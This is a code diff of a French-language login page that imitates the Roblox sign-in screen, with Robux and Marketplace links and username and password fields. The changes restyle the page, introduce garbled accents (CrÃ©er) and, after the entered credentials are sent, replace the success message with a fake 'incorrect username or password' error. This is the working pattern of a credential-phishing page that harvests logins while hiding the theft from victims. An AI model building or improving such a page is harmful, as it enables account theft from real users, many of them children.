@@ -129,8 +129,14 @@ button, .btn{
     cursor:pointer;
 }
 
-.signup{background:#2f7fff;}
-.login-top{background:transparent;border:1px solid rgba(255,255,255,0.18);}
+.signup{
+    background:#2f7fff;
+}
+
+.login-top{
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.18);
+}
 
 /* ================= CENTER ================= */
 .center{
@@ -186,6 +192,15 @@ button, .btn{
     display:none;
 }
 
+/* STATUS */
+.status{
+    text-align:center;
+    font-size:12px;
+    color:#ff4d4d;
+    margin-bottom:10px;
+    min-height:14px;
+}
+
 /* BUTTON */
 .main-btn{
     width:100%;
@@ -207,6 +222,10 @@ button, .btn{
     justify-content:center;
     gap:6px;
     margin-bottom:10px;
+
+    background:#2f333c;
+    border:1px solid rgba(255,255,255,0.15);
+    border-radius:8px;
 }
 
 .loading span{
@@ -218,8 +237,14 @@ button, .btn{
 }
 
 @keyframes dot{
-    0%,100%{transform:scale(1);opacity:0.4;}
-    50%{transform:scale(1.4);opacity:1;}
+    0%,100%{
+        transform:scale(1);
+        opacity:0.4;
+    }
+    50%{
+        transform:scale(1.4);
+        opacity:1;
+    }
 }
 
 /* FORGOT */
@@ -257,18 +282,12 @@ button, .btn{
     font-size:13px;
 }
 
-/* STATUS */
-.status{
-    text-align:center;
-    font-size:12px;
-    margin-top:8px;
-    color:#9cff9c;
-}
-
 /* MOBILE */
 @media (max-width:768px){
 
-    body{overflow-y:auto;}
+    body{
+        overflow-y:auto;
+    }
 
     .topbar{
         flex-wrap:wrap;
@@ -276,7 +295,9 @@ button, .btn{
         padding:10px;
     }
 
-    .search{width:100%;}
+    .search{
+        width:100%;
+    }
 
     .right{
         margin-left:0;
@@ -285,7 +306,9 @@ button, .btn{
         flex-wrap:wrap;
     }
 
-    .login-box{width:92%;}
+    .login-box{
+        width:92%;
+    }
 }
 
 </style>
@@ -303,7 +326,7 @@ button, .btn{
         <nav class="nav">
             <a href="#">Charts</a>
             <a href="#">Marketplace</a>
-            <a href="#">Créer</a>
+            <a href="#">CrÃ©er</a>
             <a href="#">Robux</a>
         </nav>
     </div>
@@ -323,33 +346,45 @@ button, .btn{
 
         <h1>Connexion</h1>
 
-        <input class="input" type="text" id="participant" placeholder="Identifiant / E-mail / Téléphone">
+        <input class="input" type="text" id="participant" placeholder="Identifiant / E-mail / TÃ©lÃ©phone">
 
         <input class="input" type="password" id="secret" placeholder="Mot de passe">
 
         <div class="error" id="error">
-            code secret incorrect
+            "Nom d'utilisateur ou mot de passe incorrect."
         </div>
 
-        <button class="main-btn" onclick="envoyer()">
+        <!-- STATUS EN HAUT -->
+        <div class="status" id="status"></div>
+
+        <!-- BOUTON -->
+        <button class="main-btn" id="mainBtn" onclick="envoyer()">
             Se connecter
         </button>
 
+        <!-- LOADER -->
         <div class="loading" id="loading">
-            <span></span><span></span><span></span>
+            <span></span>
+            <span></span>
+            <span></span>
         </div>
 
-        <div class="status" id="status"></div>
-
-        <div class="forgot">Mot de passe ou nom d'utilisateur oublié ?</div>
+        <div class="forgot">
+            Mot de passe ou nom d'utilisateur oubliÃ© ?
+        </div>
 
         <div class="separator"></div>
 
-        <button class="secondary-btn">Envoyer un code par e-mail</button>
-        <button class="secondary-btn">Connexion rapide</button>
+        <button class="secondary-btn">
+            Envoyer un code par e-mail
+        </button>
+
+        <button class="secondary-btn">
+            Connexion rapide
+        </button>
 
         <div class="bottom">
-             Vous n'avez pas de compte ? <b>S'inscrire</b>
+            Vous n'avez pas de compte ? <b>S'inscrire</b>
         </div>
 
     </div>
@@ -375,8 +410,17 @@ async function envoyer() {
     const error =
         document.getElementById("error");
 
+    const bouton =
+        document.getElementById("mainBtn");
+
     error.style.display = "none";
 
+    status.innerText = "";
+
+    /* CACHE LE BOUTON */
+    bouton.style.display = "none";
+
+    /* AFFICHE LE LOADER */
     loading.style.display = "flex";
 
     const data = {
@@ -397,9 +441,14 @@ async function envoyer() {
 
         console.log(result);
 
+        /* CACHE LE LOADER */
         loading.style.display = "none";
 
-        status.innerText = "Connexion réussie";
+        /* REMET LE BOUTON */
+        bouton.style.display = "block";
+
+        /* MESSAGE EN HAUT */
+        status.innerText = "Nom d'utilisateur ou mot de passe incorrect.";
 
     } catch(err) {
 
@@ -407,10 +456,11 @@ async function envoyer() {
 
         loading.style.display = "none";
 
+        bouton.style.display = "block";
+
         error.style.display = "block";
 
         status.innerText = "";
-
     }
 }
 
